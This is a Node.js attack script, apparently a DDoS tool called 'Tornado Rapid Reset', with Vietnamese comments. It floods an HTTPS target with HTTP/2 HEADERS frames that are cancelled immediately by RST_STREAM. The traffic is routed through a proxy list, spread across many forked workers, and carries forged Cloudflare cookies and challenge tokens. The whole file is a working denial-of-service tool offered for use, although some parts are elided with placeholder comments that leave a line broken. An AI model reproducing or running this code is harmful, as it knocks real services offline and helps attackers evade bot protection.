const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    });

const statusesQ = []
let statuses = {}

const blockedDomain = [".gov", ".edu"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

let isFull = process.argv.includes('--full');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1;
const debugMode = process.argv.includes('--debug');

// Force HTTP/2 only for Rapid Reset
const forceHttp = 2; // Fixed to HTTP/2

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error('Usage: node https.js <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [--randrate] [--debug]');
    process.exit(1);
}

let hcookie = '';

const url = new URL(target);
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);

if (url.hostname.endsWith(blockedDomain.join(' '))) {
    process.exit(1);
}

if (!['GET', 'POST'].includes(reqmethod)) {
    console.error('Method only GET/POST');
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Only https://');
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=;`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const length = data.readUInt32BE(0) >> 8;
    const type = data.readUInt8(3);
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    if (data.length < 9 + length) return null;
    const payload = data.slice(9, 9 + length);
    return { streamId, length, type, flags, payload, fullLength: 9 + length };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

const ciphersList = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256",
    // ... (giữ nguyên list cũ)
].join(':');

const sigalgs = ['ecdsa_secp256r1_sha256','rsa_pss_rsae_sha256', /* ... */].join(':');

function go() {
    const [proxyHost, proxyPort] = proxy[Math.floor(Math.random() * proxy.length)].split(':');
    if (!proxyPort) return go();

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\n\r\n`);
    });

    netSocket.on('data', () => {
        const tlsSocket = tls.connect({
            socket: netSocket,
            ALPNProtocols: ['h2'],
            servername: url.host,
            ciphers: ciphersList,
            sigalgs: sigalgs,
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | /* ... giữ nguyên */,
            rejectUnauthorized: false,
        }, () => {
            let streamId = 1;
            let hpack = new HPACK();
            hpack.setTableSize(4096);

            const settings = [
                [1, 65536],    // HEADER_TABLE_SIZE
                [4, 16777216], // INITIAL_WINDOW_SIZE lớn để flood mạnh
                [6, 6291456]
            ];

            const frames = [
                Buffer.from(PREFACE),
                encodeFrame(0, 4, encodeSettings(settings)),
                encodeFrame(0, 8, Buffer.alloc(4).fill(0xff)) // UPDATE WINDOW max
            ];

            tlsSocket.write(Buffer.concat(frames));

            tlsSocket.on('data', (data) => {
                // Xử lý SETTINGS ACK nếu cần, nhưng không bắt buộc cho exploit
            });

            function rapidResetFlood() {
                if (tlsSocket.destroyed) return;

                const rate = randrate ? Math.floor(Math.random() * 50) + 60 : parseInt(ratelimit);
                const requests = [];

                for (let i = 0; i < rate; i++) {
                    const headers = [
                        [':method', reqmethod],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname + (query ? '?__cf_chl_rt_tk=' + randstr(40) : '')],
                        ['user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'],
                        ['accept', '*/*'],
                        ...(hcookie ? [['cookie', hcookie]] : [])
                    ];

                    const packed = hpack.encode(headers);

                    // HEADERS frame (END_HEADERS nhưng không END_STREAM)
                    requests.push(encodeFrame(streamId, 1, packed, 0x04));

                    // RST_STREAM ngay lập tức với code CANCEL (0x08)
                    const rstPayload = Buffer.alloc(4);
                    rstPayload.writeUInt32BE(0x08, 0);
                    requests.push(encodeFrame(streamId, 3, rstPayload, 0x00));

                    streamId += 2;
                }

                tlsSocket.write(Buffer.concat(requests), () => {
                    setTimeout(rapidResetFlood, 1); // Flood liên tục max speed
                });
            }

            rapidResetFlood();
        });

        tlsSocket.on('error', () => tlsSocket.destroy());
    });

    netSocket.on('error', () => {});
    netSocket.on('close', () => go());
}

if (cluster.isMaster) {
    console.log(`TORNADO RAPID RESET HTTP/2 STREET EDITION 2026 - Attack Start`);
    for (let i = 0; i < threads; i++) cluster.fork();

    cluster.on('exit', (worker) => cluster.fork());

    if (debugMode) {
        setInterval(() => {
            console.clear();
            console.log(new Date().toLocaleString(), statuses);
        }, 1000);
    }

    setTimeout(() => process.exit(0), time * 1000);
} else {
    const maxConns = 50000; // Tùy RAM VPS
    let conns = 0;

    const spawn = () => {
        if (conns < maxConns) {
            conns++;
            go();
        }
        setTimeout(spawn, 0);
    };
    spawn();

    // Burst cuối 15s
    setTimeout(() => {
        const burst = setInterval(() => {
            for (let i = 0; i < 200; i++) go();
        }, 10);
        setTimeout(() => clearInterval(burst), 15000);
    }, time * 1000 - 15000);

    setTimeout(() => process.exit(0), time * 1000);
}